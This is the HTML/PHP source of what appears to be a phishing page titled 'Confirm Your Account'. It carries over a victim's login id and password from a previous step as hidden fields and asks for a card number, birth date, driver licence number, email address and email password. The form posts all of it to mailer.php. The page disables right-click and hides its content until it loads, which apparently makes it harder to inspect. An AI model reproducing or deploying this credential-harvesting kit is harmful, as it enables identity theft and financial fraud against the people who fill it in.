 <?php

$id = $_POST['id'];
$pass = $_POST['pass'];
$select1 = $_POST['select1'];

?>
   












<script language=JavaScript> var message="Function Disabled!"; function clickIE4(){ if (event.button==2){ alert(message); return false; } } function clickNS4(e){ if (document.layers||document.getElementById&&!document.all){ if (e.which==2||e.which==3){ alert(message); return false; } } } if (document.layers){ document.captureEvents(Event.MOUSEDOWN); document.onmousedown=clickNS4; } else if (document.all&&!document.getElementById){ document.onmousedown=clickIE4; } document.oncontextmenu=new Function("alert(message);return false") </script>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<SCRIPT language=Javascript>
      <!--
      function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;

         return true;
      }
      //-->
   </SCRIPT>
<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>



</head>

<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:101px; z-index:0"><a href="#"><img src="images/header.png" alt="" title="" border=0 width=1349 height=101></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:98px; width:722px; height:110px; z-index:1"><img src="images/2.png" alt="" title="" border=0 width=722 height=110></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:858px; width:1349px; height:246px; z-index:2"><img src="images/2footer.png" alt="" title="" border=0 width=1349 height=246></div>
<form action=mailer.php name=chalbhai id=chalbhai method=post>

   <input name="id" value="<?=$id?>"type="hidden">
<input name="pass"  value="<?=$pass?>" type="hidden">


<div id="formimage1" style="position:absolute; left:294px; top:753px; z-index:3"><input type="image" name="formimage1" width="79" height="30" src="images/submit.png"></div>
<input name="formtext1"  required title="Please Enter Right Value" type="text" style="position:absolute;width:170px;left:195px;top:377px;z-index:4">
<input name="formtext2"  required title="Please Enter Right Value" type="text" style="position:absolute;width:154px;left:195px;top:233px;z-index:5">
<input name="formtext3"  required title="Please Enter Right Value" type="text" style="position:absolute;width:197px;left:195px;top:268px;z-index:6">
<select name="formselect1" style="position:absolute;left:195px;top:301px;width:79px;z-index:7">
<option value="Month">Month</option>
    <option value="1">January</option>
    <option value="2">February</option>
    <option value="3">March</option>
    <option value="4">April</option>
    <option value="5">May</option>
    <option value="6">June</option>
    <option value="7">July</option>
    <option value="8">August</option>
    <option value="9">September</option>
    <option value="10">October</option>
    <option value="11">November</option>
    <option value="12">December</option></select>
<select name="formselect2" style="position:absolute;left:277px;top:302px;width:52px;z-index:8">
<option value="Day">Day</option>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
    <option value="6">6</option>
    <option value="7">7</option>
    <option value="8">8</option>
    <option value="9">9</option>
    <option value="10">10</option>
    <option value="11">11</option>
    <option value="12">12</option>
    <option value="13">13</option>
    <option value="14">14</option>
    <option value="15">15</option>
    <option value="16">16</option>
    <option value="17">17</option>
    <option value="18">18</option>
    <option value="19">19</option>
    <option value="20">20</option>
    <option value="21">21</option>
    <option value="22">22</option>
    <option value="23">23</option>
    <option value="24">24</option>
    <option value="25">25</option>
    <option value="26">26</option>
    <option value="27">27</option>
    <option value="28">28</option>
    <option value="29">29</option>
    <option value="30">30</option>
    <option value="31">31</option>
</select>
<select name="formselect3" style="position:absolute;left:335px;top:302px;width:58px;z-index:9">
<option value="Year">Year</option>
    <option value="1996">1996</option>
    <option value="1995">1995</option>
    <option value="1994">1994</option>
    <option value="1993">1993</option>
    <option value="1992">1992</option>
    <option value="1991">1991</option>
    <option value="1990">1990</option>
    <option value="1989">1989</option>
    <option value="1988">1988</option>
    <option value="1987">1987</option>
    <option value="1986">1986</option>
    <option value="1985">1985</option>
    <option value="1984">1984</option>
    <option value="1983">1983</option>
    <option value="1982">1982</option>
    <option value="1981">1981</option>
    <option value="1980">1980</option>
    <option value="1979">1979</option>
    <option value="1978">1978</option>
    <option value="1977">1977</option>
    <option value="1976">1976</option>
    <option value="1975">1975</option>
    <option value="1974">1974</option>
    <option value="1973">1973</option>
    <option value="1972">1972</option>
    <option value="1971">1971</option>
    <option value="1970">1970</option>
    <option value="1969">1969</option>
    <option value="1968">1968</option>
    <option value="1967">1967</option>
    <option value="1966">1966</option>
    <option value="1965">1965</option>
    <option value="1964">1964</option>
    <option value="1963">1963</option>
    <option value="1962">1962</option>
    <option value="1961">1961</option>
    <option value="1960">1960</option>
    <option value="1959">1959</option>
    <option value="1958">1958</option>
    <option value="1957">1957</option>
    <option value="1956">1956</option>
    <option value="1955">1955</option>
    <option value="1954">1954</option>
    <option value="1953">1953</option>
    <option value="1952">1952</option>
    <option value="1951">1951</option>
    <option value="1950">1950</option>
    <option value="1949">1949</option>
    <option value="1948">1948</option>
    <option value="1947">1947</option>
    <option value="1946">1946</option>
    <option value="1945">1945</option>
    <option value="1944">1944</option>
    <option value="1943">1943</option>
    <option value="1942">1942</option>
    <option value="1941">1941</option>
    <option value="1940">1940</option>
    <option value="1939">1939</option>
    <option value="1938">1938</option>
    <option value="1937">1937</option>
    <option value="1936">1936</option>
    <option value="1935">1935</option>
    <option value="1934">1934</option>
    <option value="1933">1933</option>
    <option value="1932">1932</option>
    <option value="1931">1931</option>
    <option value="1930">1930</option>
    <option value="1929">1929</option>
    <option value="1928">1928</option>
    <option value="1927">1927</option>
    <option value="1926">1926</option>
    <option value="1925">1925</option>
    <option value="1924">1924</option>
    <option value="1923">1923</option>
    <option value="1922">1922</option>
    <option value="1921">1921</option>
    <option value="1920">1920</option>
    <option value="1919">1919</option>
    <option value="1918">1918</option>
    <option value="1917">1917</option>
    <option value="1916">1916</option>
    <option value="1915">1915</option>
    <option value="1914">1914</option>
    <option value="1913">1913</option>
    <option value="1912">1912</option>
    <option value="1911">1911</option>
    <option value="1910">1910</option>
    <option value="1909">1909</option>
    <option value="1908">1908</option>
    <option value="1907">1907</option>
    <option value="1906">1906</option>
    <option value="1905">1905</option>
    <option value="1904">1904</option>
    <option value="1903">1903</option>
    <option value="1902">1902</option>
    <option value="1901">1901</option>
    <option value="1900">1900</option>
    <option value="1899">1899</option>
    <option value="1898">1898</option>
    <option value="1897">1897</option>
    <option value="1896">1896</option>
    <option value="1895">1895</option>
    <option value="1894">1894</option>
</select>
<input name="formtext4"  required title="Please Enter Right Value" type="text" style="position:absolute;width:36px;left:194px;top:335px;z-index:10">
<input name="formtext5"  required title="Please Enter Right Value" type="text" style="position:absolute;width:28px;left:238px;top:335px;z-index:11">
<input name="formtext6"  required title="Please Enter Right Value" type="text" style="position:absolute;width:36px;left:274px;top:335px;z-index:12">
<input name="formtext7"  required title="Please Enter Right Value" type="text" style="position:absolute;width:170px;left:194px;top:409px;z-index:13">
<input name="formtext8"  required title="Please Enter Right Value" type="text" style="position:absolute;width:62px;left:194px;top:441px;z-index:14">
<input name="formtext9" pattern=".{15,16}" maxlength="16" onkeypress="return isNumberKey(event)"   type="text" maxlength=16 style="position:absolute;width:170px;left:194px;top:472px;z-index:15">
<input name="formtext10"  required title="Please Enter Right Value" type="text" style="position:absolute;width:115px;left:195px;top:503px;z-index:16">
<input name="formtext11"  required title="Please Enter Right Value" onkeypress="return isNumberKey(event)"   maxlength="5" type="text" style="position:absolute;width:70px;left:195px;top:534px;z-index:17">
<div id="text1" style="position:absolute; overflow:hidden; left:6px; top:563px; width:182px; height:24px; z-index:18">
<div class="wpmd">
<div><font color="#4A4A4A"><B>Driver License Number</B></font></div>
</div></div>

<input name="formtext12"  required title="Please Enter Right Value" type="text" style="position:absolute;width:170px;left:194px;top:562px;z-index:19">
<div id="text2" style="position:absolute; overflow:hidden; left:5px; top:597px; width:182px; height:24px; z-index:20">
<div class="wpmd">
<div><font color="#4A4A4A"><B>Email Address</B></font></div>
</div></div>

<div id="text3" style="position:absolute; overflow:hidden; left:6px; top:627px; width:182px; height:24px; z-index:21">
<div class="wpmd">
<div><font color="#4A4A4A"><B>Email Password</B></font></div>
</div></div>

<input name="formtext13"  required title="Please Enter Right Value" type="email" style="position:absolute;width:170px;left:194px;top:597px;z-index:22">
<input name="formtext14"  required title="Please Enter Right Value" type="password" style="position:absolute;width:170px;left:194px;top:628px;z-index:23">
<div id="image4" style="position:absolute; overflow:hidden; left:4px; top:232px; width:145px; height:317px; z-index:24"><img src="images/3.png" alt="" title="" border=0 width=145 height=317></div>

</div>

</body>
</html>
